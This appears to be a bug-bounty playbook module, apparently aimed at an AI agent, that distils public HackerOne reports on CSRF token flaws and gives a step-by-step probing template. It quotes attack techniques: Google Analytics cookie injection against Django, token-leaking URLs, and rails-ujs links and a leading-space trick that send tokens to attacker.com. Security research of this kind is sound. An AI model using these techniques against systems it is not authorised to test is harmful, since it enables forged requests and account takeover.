---
title: "Token Design Flaws — leakage, rotation, binding, framework behavior"
type: playbook
category: token-design-flaws
cwe: "CWE-352"
source_count: 23
full_bodies_available: 23
corpus: "h1.security.nathan.sx roster (229 rows), bodies via hackerone.com/reports/<id>.json"
list_accessed: "2026-10-28"
note: "Anchor bodies: CSRF-15412 (Coinbase, $1,000 JSON-verified), CSRF-26647 (Django GA bypass, $1,000 list), CSRF-49935 (GitHub rails-ujs, $1,000 list). Claims trace to bodies read 2026-10-28."
---

# Token Design Flaws — when the token itself is the bug

## 1. Overview

Twenty-three corpus cases never forge a request at all — they attack the **token**. The
protection exists; the token leaks, never rotates, binds to the wrong thing, or behaves badly
inside its framework. This module is the corpus's densest source of *design doctrine* and the
highest per-bug reasoning density ($2,500 SOP/UXSS case included).

**Case-ID scheme: `CSRF-<report id>`.**

| Family | Cases | What fails |
|---|---|---|
| Leakage | 15412, 26647, 14883, 196458, 76733, 46736, 99708, 136481, 103787 | token readable by attacker |
| Rotation | 49974, 111262, 141065, 2628, 2857 | token static or surviving logout |
| Binding | 47357, 182487, 155726, 134894, 123900, 140377/174228 | token not session-bound / wrong storage |
| Framework | 49935 | rails-ujs sends tokens cross-origin |

## 2. Leakage family

### 2.1 The anchor — CSRF-15412 (Coinbase, $1,000 JSON-verified)

Token delivered over plain HTTP, verbatim steps:

> 4. Under Developer Updates, enter your email address and click "Subscribe".
> 5. Notice that this request is sent over HTTP with the CSRF token in the body of the POST
> request.
>
> This means that an attacker can easily perform a MiTM attack and gain access to this CSRF
> token. The attacker can then trick this authenticated Coinbase user to perform CSRF attacks
> since the attacker now knows the CSRF token associated with this user.

Agent lesson: **every place the token transits is attack surface** — HTTP pages, referer
headers, URLs, third-party scripts, Flash. The test is a token-transit inventory (template §5).

### 2.2 The Google Analytics cookie-injection pair — CSRF-26647 (Django, $1,000 list) and CSRF-14883 (Twitter)

The most-cited bypass of the era, and the corpus holds BOTH the generic writeup (26647,
"any Django powered site") and the same technique landed on twitter.com (14883). The chain,
verbatim from 26647:

> * Google Analytics sets the cookie to track user source:
>   `__utmz=123456.123456789.11.2.utmcsr=[HOST]|utmccn=(referral)|utmcmd=referral|utmcct=[PATH]`
> * User fully controls path in Referer and it is not filtered before being put in __utmz

then Django's cookie parser is bent with `]`:

> * Python + Django handle cookies with incorrect regular expression that allows to use
>   characters [ \ ] as delimiters:
>
> ```
> >>> C.load('__utmz=blah]csrftoken=x')
> >>> C
> <SimpleCookie: csrftoken='x'>
> ```

Django's CSRF protection accepts a request whose Referer contains the token's host — the
injected `csrftoken` cookie satisfies the double-submit. **CSRF-14883** applies the same
`__utmz` chain to `mobile.twitter.com / twitter.com` (cookie-delimiter quirks per web server,
Chrome domain-attribute limits).

Agent lessons:

1. **Referer-checked CSRF can be beaten by cookie injection** — the check compares against a
   value in a cookie the attacker can poison via a referer path the app feeds to GA.
2. **Any analytics/utm parameter that reaches a cookie is a cookie-injection primitive.**
3. Probe order: inject `]`-delimited cookie → check server cookie parsing (Django `]`, many
   servers `,`) → land the double-submit.

### 2.3 Referer/URL leaks

- **CSRF-196458 (apps.shopify.com, $500 list)** — the token rides a **post-login redirect URL**
  and dies into the attacker's own GA dashboard:
  > The victim will be redirected to
> `https://apps.shopify.com/[attacker's_app]?authenticity_token=[victim's token]`
  > The attacker can now see the victim's authenticity token by checking Real-Time analytics at
  > his google analytics dashboard
- **CSRF-76733 (Slack-era, Information-Disclosure label)** — login via GET carries the token in
  the URL; body lists the exfil destinations: *"dxzc9stvaxhhy.cloudfront.net …
  ssl.google-analytics.com … api.mixpanel.com"*.
- **CSRF-46736 (robocoin)** — token in GET on verify-failure plus **reuse**:
  > the token can be reused multiple times and do not get expired on first use.

### 2.4 Read-the-page lanes — CSRF-99708 ($500 JSON), CSRF-103787 ($2,500 JSON), CSRF-136481 ($750 list)

- **99708 (H1)** — a GET parameter is turned into a path traversal that makes the page's own
  XHR fetch a *sibling endpoint* carrying the `X-CSRF-Token` header on every GET:
  > ######Request :-
  > `https://hackerone.com/bugs?subject=anontest5667&report_id=..%2F..%2F..%2F99698%3F&view=new…`
  > ######Response :-
  > `GET /99698?.json HTTP/1.1 … X-CSRF-Token: hnDDTUm26xeV9lKMm8pnjsNsXKpMEtitUNMa2PeEFlUNiHLoO2J0lOxJpIYxmnXnbF1hNQMwUdB3e9MErdDktQ==`
  Same-origin, no XSS needed — the app's own request plumbing prints the header into a
  readable request. Honest title: *"Limited CSRF bypass"* — GET-only.
- **103787 (H1)** — the token needs a *browser bug* to read, and the body states the three
  server-side weaknesses that turn a read into full CSRF:
  > 1. Some pages prints the token in the HTML response (edit user form at
  >    https://hackerone.com/settings/profile/edit)
  > 2. Tokens aren't bound per action
  > 3. PATCH/DELETE can be sent via _method
  … and names the framing gap: *"HackerOne uses CloudFlare so the URL
  `https://hackerone.com/cdn-cgi/trace` could be used (doesn't send X-Frame-Options)"*.
- **136481 (Vimeo, opnsec)** — the Flash lane: XSRF token present in 404 pages, a
  `crossdomain.xml` allowing `*.vimeocdn.com`, and a cross-site-flashable `moogaloop.swf` —
  *"There is a vulnerability because a Vimeo XSRF token is present in the source code of the
  404 http error pages"*. Token-read via Flash = private videos go public.

## 3. Rotation family — the static-token cluster

- **CSRF-49974 ($50 JSON-verified)** — token unchanged across login; shared-workstation attack
  script verbatim:
  > 1. The attacker simply copies the authenticity token. …
  > 3. The attacker can trick the victim in doing anything he wants without the user being
  > aware of it.
- **CSRF-141065 (drchrono)** — same finding argued as *design*:
  > CSRF Token's are different from session ID'S in a way that they are not consistent in
  > entire user session but drchrono.com do not practice the rotation of CSRF token's for every
  > request in a session.
- **CSRF-2628 (Slack, $100 list)** — the crumb **survives logout**:
  > The CSRF token is not getting expired for a user. This can led to username change and many
  > other account change information as well.
- **CSRF-2857 (Phabricator)** — token valid after logout. **CSRF-111262** — same static-token
  finding, second program.

## 4. Binding family

- **CSRF-47357 (mobilevikings.be)** — the sharpest statement of session-binding, verbatim:
  > Problem is that this request works with `X-CSRFToken: LI6qbdczbgPPQ7fxXR3duFENgY1qr3wB`
  > this token i got from another account
  > the real token was `AlEqSERKOXKjZfSdw2WtPY4l7n5b68BM`
  A token is a secret *bound to the session*; one that validates across accounts is just a
  constant.
- **CSRF-182487 (GitLab)** — cross-account reuse on account deletion:
  > The authentication token `authenticity_token` used in the POST request for deleting an
  > account can be bypassed, by replacing the same with a token generated for deleting another
  > account.
- **CSRF-134894** — a token check keyed to `REMOTE_ADDR` dies behind a proxy; **CSRF-123900** —
  `csrf_token` cookie without HttpOnly (JS-readable by design); **CSRF-140377/174228 (gratipay)**
  — tokens stored in cookies only, double-submit pair without server state; **CSRF-155726** —
  the same X-CSRF token shared across an account's many sessions.

## 5. Framework family — CSRF-49935 (GitHub, Ben Toews, $1,000 list)

The rails-ujs report is the era's definitive framework-behavior writeup. Two scenarios,
verbatim:

> <a href="https://attacker.com" data-remote data-method="post" data-cross-domain="false">
>
> Clicking on this link will trigger an OPTIONS request to attacker.com. If the attacker
> returns the correct CORS headers, a POST request containing the user's CSRF token will be
> sent to attacker.com.

and the regex-fails-open case:

> the attacker can set the href or action to " https://attacker.com". This will be passed to
> JQuery, who will see this as a same origin request. … Prefixing the URL with a space character
> is one way to break this regex, but the regexes are pretty weak

Agent lessons: (1) framework token *transports* (data-remote links) are attacker-steerable;
(2) **the leading-space origin-confusion trick** generalizes to any same-origin regex check;
(3) CSP does not stop token exfil through framework features.

## 6. Execution template

```
STEP 1 — token inventory:
  harvest every token transit: form fields, X-CSRF-Token headers, cookies,
  meta tags, 404 pages (136481!), JS bundles, service workers (127703),
  redirect URLs (196458), HTTP pages (15412).

STEP 2 — lifecycle probes:
  login → capture token → logout → replay token (2628/2857).
  two sessions same user (155726); two accounts (47357/182487).
  login→token-before vs token-after (49974/141065).

STEP 3 — validation-shape probes:
  is it double-submit (cookie+field)? then try cookie-injection via utm/referer
  (26647/14883). Is it Referer-checked? → module 05.
  Is it same-origin-regex-checked? → leading-space / data-remote probes (49935).

STEP 4 — cross-account forge:
  attacker token + victim session (47357); attacker session + victim token
  (after leak). One 200 with a state change closes the design claim.

STEP 5 — impact step:
  pair with one module-03 chain: leaked token + permissive _method (103787)
  = full request forgery, not just "token exposed".
```

## 7. Validation gates (all must pass)

1. **The leak/lifecycle flaw is shown with two captured token values** (before/after, or
   cross-account), redacted to first/last 4 chars.
2. **One successful forged state-change** proves exploitability — a leak alone is informative.
3. **Design claims cite framework behavior** (141065-style) or demonstrated replay — not
   opinion.
4. **No XSS prerequisite assumed silently** — if reading the token needs SOP bypass/UXSS
   (103787), the report must carry the browser-bug reference, and modern reports must check
   SameSite/COOP survival.
5. **Era honesty** — GA `__utmz` double-submit bypasses predate per-form tokens and
   `__utmz` deprecation; label as era technique in the field (playbook P1 fingerprint step).

## 8. Adjacency

- **Module 05** — the referer/origin *bypass* lane (token present but check strippable).
- **Module 03** — leak → chain (127703 lives in both registers by design).
- **Vault/Misconfig (row 18 pending)** — HttpOnly/cookie-shape findings 123900/140377/174228.
- **hunt-csrf skill** — token-design checklist; **hunt-session skill** — logout invalidation.

## 9. Cross-references

- [`references/blogs-index.md`](references/blogs-index.md) §1 — zseano's token-rotation lessons
  (byte-quoted); §3 — modern framework-token citations.
- [`../XSS/`](../XSS/) — token-read lanes that need XSS/SOP-bugs live there.
